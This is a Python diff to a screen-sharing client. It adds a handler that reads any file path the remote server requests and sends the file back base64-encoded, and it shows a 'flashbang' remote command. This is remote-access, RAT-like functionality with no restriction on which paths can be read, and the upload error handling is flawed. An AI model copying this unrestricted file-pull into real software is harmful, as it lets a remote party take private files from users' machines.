@@ -79,14 +79,43 @@ class ScreenSharingClient:
                         if os.path.exists(location):
                             file_path = os.path.join(location, file_name)
                             with open(file_path, "wb") as f:
-                                f.write(file_data)
-                            self.socket.sendall("C".encode("utf-8"))
+                                try:
+                                    f.write(file_data)
+                                except PermissionError:
+                                    self.socket.sendall("F".encode("utf-8"))
+                                    self.socket.sendall("fileUp".encode("utf-8"))
+                            self.socket.sendall("F".encode("utf-8"))
                             self.socket.sendall("fileUs".encode("utf-8"))
-                            print("sent affirmation")
                         else:
-                            self.socket.sendall("C".encode("utf-8"))
+                            self.socket.sendall("F".encode("utf-8"))
                             self.socket.sendall("fileUl".encode("utf-8"))
                         continue
+                    elif tag == "fileD":
+                        print("File Download Request")
+                        while True:
+                            file = ""
+                            while (
+                                received_character := self.socket.recv(1).decode(
+                                    "utf-8"
+                                )
+                            ) != "|":
+                                file += received_character
+                            break
+                        if os.path.exists(file):
+                            with open(file, "rb") as fileD:
+                                file_data_D = fileD.read()
+                                base64FileData = base64.b64encode(file_data_D).decode(
+                                    "ascii"
+                                )
+                            self.socket.sendall("F".encode("utf-8"))
+                            self.socket.sendall(
+                                f"fileDoincoming{os.path.basename(file)}|{len(base64FileData)} {base64FileData}".encode(
+                                    "utf-8"
+                                )
+                            )
+                        else:
+                            self.socket.sendall("F".encode("utf-8"))
+                            self.socket.sendall("fileDolocation".encode("utf-8"))
                 command = self.socket.recv(1024).decode("utf-8")
                 if command.lower() == "flashbang":
                     try:
